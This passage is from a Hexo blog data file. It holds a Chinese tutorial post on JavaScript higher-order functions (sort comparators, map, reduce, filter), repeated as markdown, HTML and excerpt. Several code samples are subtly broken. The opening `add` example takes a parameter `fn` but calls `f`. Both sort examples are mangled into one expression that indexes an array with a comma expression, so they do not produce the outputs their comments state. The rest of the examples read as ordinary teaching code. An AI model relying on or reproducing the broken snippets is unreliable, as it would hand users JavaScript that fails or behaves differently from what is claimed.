view的自动更新。至于从view =&gt; data，熟悉的dom事件绑定，就如我们开头说的，事件绑定也是观察者模式。</p>\n<p>参考：<br>图一相关：<a href=\"http://www.cnblogs.com/libin-1/p/6893712.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/libin-1/p/6893712.html</a><br>图二相关：<a href=\"https://blog.csdn.net/github_36369819/article/details/79201314\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/github_36369819/article/details/79201314</a></p>"},{"title":"JavaScript高阶函数常用场景","date":"2019-04-10T06:09:46.000Z","updated":"2019-04-10T06:09:46.000Z","_content":"\n# 概述\n\n数组有一维到多维，函数也有低阶到高阶，高阶函数的直观表现形式为一个函数接收另一个函数作为参数。\n\n<!-- more -->\n\n# 详述\n\n## 最简单的高阶函数示例\n\n```js\nfunction add(x, y, fn) {\n  return f(x) + f(y);\n}\n```\n\n## sort 排序\n\n数组的 sort 方法默认是按照字典排序，很多时候并不适合我们的实际需求，例如：\n\n```js\n[2, 10, 3].sort()[\n  // [10, 2, 3]\n\n  (\"Google\", \"apple\", \"Microsoft\")\n].sort();\n// ['Google', 'Microsoft', 'apple']\n```\n\n另外实际中也经常会涉及到按照对象的某个属性排序，这时候就需要我们自己创建比较函数，然后作为参数传给 sort 方法。例如：\n\n```js\n//示例一\n[2, 10, 3]\n  .sort((x, y) => {\n    return x - y;\n  })\n  [\n    // [2, 3, 10]\n\n    // 示例二\n    (\"Google\", \"apple\", \"Microsoft\")\n  ].sort(function(s1, s2) {\n    var x1 = s1.toUpperCase();\n    var x2 = s2.toUpperCase();\n    if (x1 < x2) {\n      return -1;\n    } else if (x1 > x2) {\n      return 1;\n    } else {\n      return 0;\n    }\n  });\n// [\"apple\", \"Google\", \"Microsoft\"]\n\n// 示例三\nvar arr = [\n  {\n    id: 1,\n    name: \"Jack\"\n  },\n  {\n    id: 3,\n    name: \"Tom\"\n  },\n  {\n    id: 2,\n    name: \"Alax\"\n  }\n];\n\nfunction createComparisonFunction(propertyName) {\n  return function(object1, object2) {\n    var value1 = object1[propertyName];\n    var value2 = object2[propertyName];\n    if (value1 < value2) {\n      return -1;\n    } else if (value1 > value2) {\n      return 1;\n    } else {\n      return 0;\n    }\n  };\n}\narr.sort(createComparisonFunction(\"id\"));\n// [{id: 1, name: \"Jack\"}, {id: 2, name: \"Alax\"}, {id: 3, name: \"Tom\"}]\n```\n\n## map/reduce\n```js\nfunction pow(x) {\n    return x * x;\n}\nvar arr = [1, 2, 3, 4, 5, 6, 7, 8, 9];\narr.map(pow); \n// [1, 4, 9, 16, 25, 36, 49, 64, 81]\n\n\nvar arr = [1, 2, 3, 4, 5, 6, 7, 8, 9];\narr.map(String); \n// ['1', '2', '3', '4', '5', '6', '7', '8', '9']\n\n\nvar arr = [1, 3, 5, 7, 9];\narr.reduce(function (x, y) {\n    return x + y;\n}); \n// 25\n```\n\n## filter\n```js\n//例如，在一个Array中，删掉偶数，只保留奇数，可以这么写：\nvar arr = [1, 2, 4, 5, 6, 9, 10, 15];\nvar r = arr.filter(function (x) {\n    return x % 2 !== 0;\n});\nr; // [1, 5, 9, 15]\n\n\n//把一个Array中的空字符串删掉，可以这么写：\nvar arr = ['A', '', 'B', null, undefined, 'C', '  '];\nvar r = arr.filter(function (s) {\n    return s && s.trim(); // 注意：IE9以下的版本没有trim()方法\n});\nr; // ['A', 'B', 'C']\n\n\n//利用filter，可以巧妙地去除Array的重复元素：\nvar arr = ['apple', 'strawberry', 'banana', 'pear', 'apple', 'orange', 'orange', 'strawberry'];\nvar r = arr.filter(function (element, index, self) {\n    return self.indexOf(element) === index;\n});\nr; // [\"apple\", \"strawberry\", \"banana\", \"pear\", \"orange\"]\n//去除重复元素依靠的是indexOf总是返回第一个元素的位置，后续的重复元素位置与indexOf返回的位置不相等，因此被filter滤掉了。\n```\n# 参考\nhttp://www.cnblogs.com/goloving/p/8361705.html","source":"_posts/2019/04/2019-04-10-higher-order-function.md","raw":"---\ntitle: JavaScript高阶函数常用场景\ntags:\n  - JavaScript\ncategories:\n  - 前端\ndate: 2019-04-10 14:09:46\nupdated: 2019-04-10 14:09:46\n---\n\n# 概述\n\n数组有一维到多维，函数也有低阶到高阶，高阶函数的直观表现形式为一个函数接收另一个函数作为参数。\n\n<!-- more -->\n\n# 详述\n\n## 最简单的高阶函数示例\n\n```js\nfunction add(x, y, fn) {\n  return f(x) + f(y);\n}\n```\n\n## sort 排序\n\n数组的 sort 方法默认是按照字典排序，很多时候并不适合我们的实际需求，例如：\n\n```js\n[2, 10, 3].sort()[\n  // [10, 2, 3]\n\n  (\"Google\", \"apple\", \"Microsoft\")\n].sort();\n// ['Google', 'Microsoft', 'apple']\n```\n\n另外实际中也经常会涉及到按照对象的某个属性排序，这时候就需要我们自己创建比较函数，然后作为参数传给 sort 方法。例如：\n\n```js\n//示例一\n[2, 10, 3]\n  .sort((x, y) => {\n    return x - y;\n  })\n  [\n    // [2, 3, 10]\n\n    // 示例二\n    (\"Google\", \"apple\", \"Microsoft\")\n  ].sort(function(s1, s2) {\n    var x1 = s1.toUpperCase();\n    var x2 = s2.toUpperCase();\n    if (x1 < x2) {\n      return -1;\n    } else if (x1 > x2) {\n      return 1;\n    } else {\n      return 0;\n    }\n  });\n// [\"apple\", \"Google\", \"Microsoft\"]\n\n// 示例三\nvar arr = [\n  {\n    id: 1,\n    name: \"Jack\"\n  },\n  {\n    id: 3,\n    name: \"Tom\"\n  },\n  {\n    id: 2,\n    name: \"Alax\"\n  }\n];\n\nfunction createComparisonFunction(propertyName) {\n  return function(object1, object2) {\n    var value1 = object1[propertyName];\n    var value2 = object2[propertyName];\n    if (value1 < value2) {\n      return -1;\n    } else if (value1 > value2) {\n      return 1;\n    } else {\n      return 0;\n    }\n  };\n}\narr.sort(createComparisonFunction(\"id\"));\n// [{id: 1, name: \"Jack\"}, {id: 2, name: \"Alax\"}, {id: 3, name: \"Tom\"}]\n```\n\n## map/reduce\n```js\nfunction pow(x) {\n    return x * x;\n}\nvar arr = [1, 2, 3, 4, 5, 6, 7, 8, 9];\narr.map(pow); \n// [1, 4, 9, 16, 25, 36, 49, 64, 81]\n\n\nvar arr = [1, 2, 3, 4, 5, 6, 7, 8, 9];\narr.map(String); \n// ['1', '2', '3', '4', '5', '6', '7', '8', '9']\n\n\nvar arr = [1, 3, 5, 7, 9];\narr.reduce(function (x, y) {\n    return x + y;\n}); \n// 25\n```\n\n## filter\n```js\n//例如，在一个Array中，删掉偶数，只保留奇数，可以这么写：\nvar arr = [1, 2, 4, 5, 6, 9, 10, 15];\nvar r = arr.filter(function (x) {\n    return x % 2 !== 0;\n});\nr; // [1, 5, 9, 15]\n\n\n//把一个Array中的空字符串删掉，可以这么写：\nvar arr = ['A', '', 'B', null, undefined, 'C', '  '];\nvar r = arr.filter(function (s) {\n    return s && s.trim(); // 注意：IE9以下的版本没有trim()方法\n});\nr; // ['A', 'B', 'C']\n\n\n//利用filter，可以巧妙地去除Array的重复元素：\nvar arr = ['apple', 'strawberry', 'banana', 'pear', 'apple', 'orange', 'orange', 'strawberry'];\nvar r = arr.filter(function (element, index, self) {\n    return self.indexOf(element) === index;\n});\nr; // [\"apple\", \"strawberry\", \"banana\", \"pear\", \"orange\"]\n//去除重复元素依靠的是indexOf总是返回第一个元素的位置，后续的重复元素位置与indexOf返回的位置不相等，因此被filter滤掉了。\n```\n# 参考\nhttp://www.cnblogs.com/goloving/p/8361705.html","slug":"2019-04-10-higher-order-function","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xb005gwovv77ey6twd","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>数组有一维到多维，函数也有低阶到高阶，高阶函数的直观表现形式为一个函数接收另一个函数作为参数。</p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"最简单的高阶函数示例\"><a href=\"#最简单的高阶函数示例\" class=\"headerlink\" title=\"最简单的高阶函数示例\"></a>最简单的高阶函数示例</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">x, y, fn</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> f(x) + f(y);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"sort-排序\"><a href=\"#sort-排序\" class=\"headerlink\" title=\"sort 排序\"></a>sort 排序</h2><p>数组的 sort 方法默认是按照字典排序，很多时候并不适合我们的实际需求，例如：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[<span class=\"number\">2</span>, <span class=\"number\">10</span>, <span class=\"number\">3</span>].sort()[</span><br><span class=\"line\">  <span class=\"comment\">// [10, 2, 3]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  (<span class=\"string\">\"Google\"</span>, <span class=\"string\">\"apple\"</span>, <span class=\"string\">\"Microsoft\"</span>)</span><br><span class=\"line\">].sort();</span><br><span class=\"line\"><span class=\"comment\">// ['Google', 'Microsoft', 'apple']</span></span><br></pre></td></tr></table></figure>\n<p>另外实际中也经常会涉及到按照对象的某个属性排序，这时候就需要我们自己创建比较函数，然后作为参数传给 sort 方法。例如：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//示例一</span></span><br><span class=\"line\">[<span class=\"number\">2</span>, <span class=\"number\">10</span>, <span class=\"number\">3</span>]</span><br><span class=\"line\">  .sort(<span class=\"function\">(<span class=\"params\">x, y</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x - y;</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">  [</span><br><span class=\"line\">    <span class=\"comment\">// [2, 3, 10]</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 示例二</span></span><br><span class=\"line\">    (<span class=\"string\">\"Google\"</span>, <span class=\"string\">\"apple\"</span>, <span class=\"string\">\"Microsoft\"</span>)</span><br><span class=\"line\">  ].sort(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">s1, s2</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> x1 = s1.toUpperCase();</span><br><span class=\"line\">    <span class=\"keyword\">var</span> x2 = s2.toUpperCase();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (x1 &lt; x2) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (x1 &gt; x2) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"><span class=\"comment\">// [\"apple\", \"Google\", \"Microsoft\"]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 示例三</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    id: <span class=\"number\">1</span>,</span><br><span class=\"line\">    name: <span class=\"string\">\"Jack\"</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    id: <span class=\"number\">3</span>,</span><br><span class=\"line\">    name: <span class=\"string\">\"Tom\"</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    id: <span class=\"number\">2</span>,</span><br><span class=\"line\">    name: <span class=\"string\">\"Alax\"</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createComparisonFunction</span>(<span class=\"params\">propertyName</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">object1, object2</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> value1 = object1[propertyName];</span><br><span class=\"line\">    <span class=\"keyword\">var</span> value2 = object2[propertyName];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (value1 &lt; value2) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (value1 &gt; value2) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">arr.sort(createComparisonFunction(<span class=\"string\">\"id\"</span>));</span><br><span class=\"line\"><span class=\"comment\">// [&#123;id: 1, name: \"Jack\"&#125;, &#123;id: 2, name: \"Alax\"&#125;, &#123;id: 3, name: \"Tom\"&#125;]</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"map-reduce\"><a href=\"#map-reduce\" class=\"headerlink\" title=\"map/reduce\"></a>map/reduce</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pow</span>(<span class=\"params\">x</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x * x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>];</span><br><span class=\"line\">arr.map(pow); </span><br><span class=\"line\"><span class=\"comment\">// [1, 4, 9, 16, 25, 36, 49, 64, 81]</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>];</span><br><span class=\"line\">arr.map(<span class=\"built_in\">String</span>); </span><br><span class=\"line\"><span class=\"comment\">// ['1', '2', '3', '4', '5', '6', '7', '8', '9']</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>];</span><br><span class=\"line\">arr.reduce(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">x, y</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x + y;</span><br><span class=\"line\">&#125;); </span><br><span class=\"line\"><span class=\"comment\">// 25</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"filter\"><a href=\"#filter\" class=\"headerlink\" title=\"filter\"></a>filter</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//例如，在一个Array中，删掉偶数，只保留奇数，可以这么写：</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">15</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> r = arr.filter(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">x</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x % <span class=\"number\">2</span> !== <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">r; <span class=\"comment\">// [1, 5, 9, 15]</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//把一个Array中的空字符串删掉，可以这么写：</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"string\">'A'</span>, <span class=\"string\">''</span>, <span class=\"string\">'B'</span>, <span class=\"literal\">null</span>, <span class=\"literal\">undefined</span>, <span class=\"string\">'C'</span>, <span class=\"string\">'  '</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> r = arr.filter(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">s</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s &amp;&amp; s.trim(); <span class=\"comment\">// 注意：IE9以下的版本没有trim()方法</span></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">r; <span class=\"comment\">// ['A', 'B', 'C']</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//利用filter，可以巧妙地去除Array的重复元素：</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"string\">'apple'</span>, <span class=\"string\">'strawberry'</span>, <span class=\"string\">'banana'</span>, <span class=\"string\">'pear'</span>, <span class=\"string\">'apple'</span>, <span class=\"string\">'orange'</span>, <span class=\"string\">'orange'</span>, <span class=\"string\">'strawberry'</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> r = arr.filter(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">element, index, self</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> self.indexOf(element) === index;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">r; <span class=\"comment\">// [\"apple\", \"strawberry\", \"banana\", \"pear\", \"orange\"]</span></span><br><span class=\"line\"><span class=\"comment\">//去除重复元素依靠的是indexOf总是返回第一个元素的位置，后续的重复元素位置与indexOf返回的位置不相等，因此被filter滤掉了。</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"http://www.cnblogs.com/goloving/p/8361705.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/goloving/p/8361705.html</a></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>数组有一维到多维，函数也有低阶到高阶，高阶函数的直观表现形式为一个函数接收另一个函数作为参数。</p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"最简单的高阶函数示例\"><a href=\"#最简单的高阶函数示例\" class=\"headerlink\" title=\"最简单的高阶函数示例\"></a>最简单的高阶函数示例</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">x, y, fn</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> f(x) + f(y);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"sort-排序\"><a href=\"#sort-排序\" class=\"headerlink\" title=\"sort 排序\"></a>sort 排序</h2><p>数组的 sort 方法默认是按照字典排序，很多时候并不适合我们的实际需求，例如：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[<span class=\"number\">2</span>, <span class=\"number\">10</span>, <span class=\"number\">3</span>].sort()[</span><br><span class=\"line\">  <span class=\"comment\">// [10, 2, 3]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  (<span class=\"string\">\"Google\"</span>, <span class=\"string\">\"apple\"</span>, <span class=\"string\">\"Microsoft\"</span>)</span><br><span class=\"line\">].sort();</span><br><span class=\"line\"><span class=\"comment\">// ['Google', 'Microsoft', 'apple']</span></span><br></pre></td></tr></table></figure>\n<p>另外实际中也经常会涉及到按照对象的某个属性排序，这时候就需要我们自己创建比较函数，然后作为参数传给 sort 方法。例如：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//示例一</span></span><br><span class=\"line\">[<span class=\"number\">2</span>, <span class=\"number\">10</span>, <span class=\"number\">3</span>]</span><br><span class=\"line\">  .sort(<span class=\"function\">(<span class=\"params\">x, y</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x - y;</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">  [</span><br><span class=\"line\">    <span class=\"comment\">// [2, 3, 10]</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 示例二</span></span><br><span class=\"line\">    (<span class=\"string\">\"Google\"</span>, <span class=\"string\">\"apple\"</span>, <span class=\"string\">\"Microsoft\"</span>)</span><br><span class=\"line\">  ].sort(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">s1, s2</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> x1 = s1.toUpperCase();</span><br><span class=\"line\">    <span class=\"keyword\">var</span> x2 = s2.toUpperCase();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (x1 &lt; x2) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (x1 &gt; x2) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"><span class=\"comment\">// [\"apple\", \"Google\", \"Microsoft\"]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 示例三</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    id: <span class=\"number\">1</span>,</span><br><span class=\"line\">    name: <span class=\"string\">\"Jack\"</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    id: <span class=\"number\">3</span>,</span><br><span class=\"line\">    name: <span class=\"string\">\"Tom\"</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    id: <span class=\"number\">2</span>,</span><br><span class=\"line\">    name: <span class=\"string\">\"Alax\"</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createComparisonFunction</span>(<span class=\"params\">propertyName</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">object1, object2</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> value1 = object1[propertyName];</span><br><span class=\"line\">    <span class=\"keyword\">var</span> value2 = object2[propertyName];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (value1 &lt; value2) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (value1 &gt; value2) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">arr.sort(createComparisonFunction(<span class=\"string\">\"id\"</span>));</span><br><span class=\"line\"><span class=\"comment\">// [&#123;id: 1, name: \"Jack\"&#125;, &#123;id: 2, name: \"Alax\"&#125;, &#123;id: 3, name: \"Tom\"&#125;]</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"map-reduce\"><a href=\"#map-reduce\" class=\"headerlink\" title=\"map/reduce\"></a>map/reduce</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span 